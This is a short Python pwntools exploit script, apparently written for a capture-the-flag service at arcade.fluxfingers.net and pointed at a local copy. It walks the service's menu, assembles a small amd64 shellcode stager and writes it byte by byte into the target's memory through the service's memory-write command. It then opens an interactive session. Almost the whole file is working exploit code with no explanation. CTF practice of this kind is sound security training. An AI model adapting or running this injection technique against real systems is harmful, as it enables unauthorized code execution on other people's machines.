#!/usr/bin/python
from pwn import *

host = 'arcade.fluxfingers.net'
port = 1812
host = 'localhost'
port = 4000
context.arch = 'amd64'
def send(msg):
    r.recvuntil('> ')
    r.sendline(msg)

r = remote(host, port)
#start = 0x430
start = 0x5f0
#send('beer')
send('cosmopolitan')
send('2')
send('y')
x = '''
xor eax, eax;
dec edi;
mov rsi, 0x601f00;
add edx, 1;
push rsi;
pop rbp;
syscall;
leave;
ret;
'''
print (len(asm(x)))
payload = asm(x)
counter = -1
for byte in payload:
    counter += 1
    text = ('M ' + hex(start + counter)[2:] + ' ' + hex(ord(byte))[2:].rjust(2, '0'))
    print (text)
    send(text)
r.interactive()
